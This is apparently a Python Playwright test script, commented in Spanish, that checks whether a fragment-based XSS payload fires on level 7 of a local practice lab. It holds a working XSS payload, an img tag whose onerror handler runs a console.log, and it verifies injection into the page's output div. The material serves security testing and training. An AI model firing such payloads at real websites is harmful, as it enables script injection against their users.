#!/usr/bin/env python3
"""
Test Fragment XSS Level 7 - versión mejorada
Asegura que el JS del navegador ejecute antes de verificar
"""
import asyncio
from playwright.async_api import async_playwright

async def test_fragment_v2():
    print("\n🎯 Test Fragment XSS Level 7 (v2 - con esperas)\n")
    print("="*60)
    
    # Payload simple
    payload = "<img src=x onerror=console.log('XSS_FIRED')>"
    test_url = f"http://127.0.0.1:5090/xss/level7#{payload}"
    
    print(f"Payload: {payload}")
    print(f"URL: {test_url}\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        # Capturar console logs
        console_logs = []
        page.on("console", lambda msg: console_logs.append(msg.text))
        
        try:
            print("📍 Navegando a Level 7...")
            # await page.goto(test_url, wait_until="load")
            await page.goto(test_url)
            
            # Esperar a que el JS del nivel se ejecute
            print("⏳ Esperando JavaScript...")
            await asyncio.sleep(3)
            
            # Leer el contenido del div#output
            output_html = await page.inner_html('#output')
            
            print("\n📊 Resultados:")
            print(f"  Console logs: {console_logs}")
            print(f"  Output div innerHTML: {output_html[:100] if output_html else 'VACÍO'}")
            
            # Verificar si el payload está en el DOM
            if payload in output_html:
                print("\n✅ ¡Payload inyectado en DOM!")
                
                # Verificar si ejecutó
                if 'XSS_FIRED' in str(console_logs):
                    print("🎉 ¡XSS EJECUTADO! (console.log detectado)")
                    return True
                else:
                    print("🟡 Payload en DOM pero no ejecutado (CSP bloqueó?)")
                    
                    # Ver errores de consola
                    errors = await page.evaluate("() => window.__errors || []")
                    if errors:
                        print(f"  Errores: {errors}")
                    
                    return False
            else:
                print("\n❌ Payload NO inyectado")
                print(f"  Output div esperaba: {payload[:50]}...")
                print(f"  Output div tiene: {output_html[:50] if output_html else 'nada'}")
                return False
                
        except Exception as e:
            print(f"\n❌ Error: {e}")
            import traceback
            traceback.print_exc()
            return False
        finally:
            await browser.close()

if __name__ == "__main__":
    result = asyncio.run(test_fragment_v2())
    exit(0 if result else 1)
